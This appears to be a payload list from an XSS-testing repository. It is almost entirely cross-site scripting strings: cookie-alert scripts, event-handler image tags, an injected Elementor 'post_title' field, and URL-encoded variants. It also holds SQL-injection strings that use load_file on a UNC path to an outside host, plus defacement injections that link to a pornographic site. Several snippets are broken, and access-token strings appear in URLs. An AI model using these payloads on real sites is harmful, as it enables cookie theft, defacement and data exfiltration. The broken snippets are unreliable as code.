## DOM & STORED
```
<script>alert(document.cookie)</script>
<script>alert('document.cookie')</script>
<script>alert("document.cookie")</script>
<script>alert(document.domain)</script>
qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
```
## Self Cross-Site Scripting 
```mysql
<img src="" onerror="alert(document.cookie)">
```
## Non ExistantImage
```
<div><image src=validateNonExistantImage.png onloadstart=alert(1337)>hello from nu11secur1ty</div>
```
## Existant-Image + ENCODED = XSS-Reflected
```
<div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
------------------------------------------------------------------------------------------------------------------------------------------------------
bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.giphy.com/media/bTByutamJSjhS/giphy.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
------------------------------------------------------------------------------------------------------------------------------------------------------
bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
------------------------------------------------------------------------------------------------------------------------------------------------------
%62%62%62%62%27%2b%28%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%27%5c%5c%5c%5c%37%31%36%67%62%31%63%66%65%39%67%6b%6a%61%34%7a%64%6a%34%35%71%78%78%39%32%30%38%76%77%6c%6b%63%6e%30%65%6e%36%62%76%2e%73%74%75%70%69%64%2e%63%6f%6d%5c%5c%6e%62%71%27%29%29%2b%27%74%38%78%71%76%3c%64%69%76%3e%3c%69%6d%61%67%65%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%20%6f%6e%6c%6f%61%64%73%74%61%72%74%3d%61%6c%65%72%74%28%31%33%33%37%29%3e%68%65%6c%6c%6f%20%66%72%6f%6d%20%6e%75%31%31%73%65%63%75%72%31%74%79%3c%2f%64%69%76%3e%3c%2f%73%63%72%69%70%74%3e%75%6f%75%32%0a

```

## Get cookie
```
nu11secur1ty<script>alert(document.cookie)</script>
```
## Alert check
```
<script>alert("Hello");</script>
<script>alert("nu11secur1ty_is_here");</script>
```

## Hidden Image
```
<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp?token=GHSAT0AAAAAABTHSDC76YMVBQKZ7VLVFSBAYTHWGMQ'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
```
## Post image
```
<form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
```
- 0.1
```
</span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
```

- 0.4
```
</span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif>welcome<a href=https://pornhub.com/>
```

- 0.5 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://th.bing.com/th/id/OIP.oiIYrhY78i7grK52ZoHsJAHaEH?pid=ImgDet&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 0.5.1 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 0.5.3 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 0.5.4 - Stupid Reflected blow 0ut
```
<a href="https://www.pornhub.com/view_video.php?viewkey=ph61f4241e1d586" target="_blank" rel="noopener nofollow ugc">
<img src="https://dl.phncdn.com/gif/41165761.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 1.4.0 - size 10%, Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:10%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

## Shame on you
- 00
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```
- 01
```
<a href="https://www.nu11secur1ty.com/"><img src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif">
```
- 02
```
%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6e%75%31%31%73%65%63%75%72%31%74%79%2e%63%6f%6d%2f%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%22%3e
```

## without error report + link to malicious URL

```js
<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/></span>
<img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>
----------------------------------------------------------------------------------------------------------------------------------------------------------
<a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif" width=150" height="70">
<a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif">
%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6e%75%31%31%73%65%63%75%72%31%74%79%2e%63%6f%6d%2f%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%63%64%6e%35%2d%63%61%70%72%69%6f%66%69%6c%65%73%2e%6e%65%74%64%6e%61%2d%73%73%6c%2e%63%6f%6d%2f%77%70%2d%63%6f%6e%74%65%6e%74%2f%75%70%6c%6f%61%64%73%2f%32%30%31%37%2f%30%37%2f%49%4d%47%5f%30%30%36%38%2e%67%69%66%22%3e%0a%0a
```
## chalg@4
```js
<a href="https://www.youtube.com/watch?v=yPuC4Cy2ZuI" target="_blank" rel="noopener nofollow ugc">
<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
```

## chalg@4 0ut
```js
<a href="https://www.youtube.com/watch?v=yPuC4Cy2ZuI" target="_blank" rel="noopener nofollow ugc">
<img src="https://i.makeagif.com/media/4-26-2015/6XX5F7.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
```

## Error check
```
</span><img src=1 onerror=alert(1) /><span>
```
## CSFR tokens
```
<form action="https:/yourdomain.com/acquire_token.php"></textarea>
```
## Geolocation
```
<script>Var today = new Date().toLocaleString() + 'week' + 'day one two three four five six'.charAt(new Date().getDay());document.getElementById('remote').src = "htttp:// + today + "----" + encodeURIComponent(position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude</script>
```
## "post_title" parameter
```
<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
```
## Document_cookie
```
<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
```
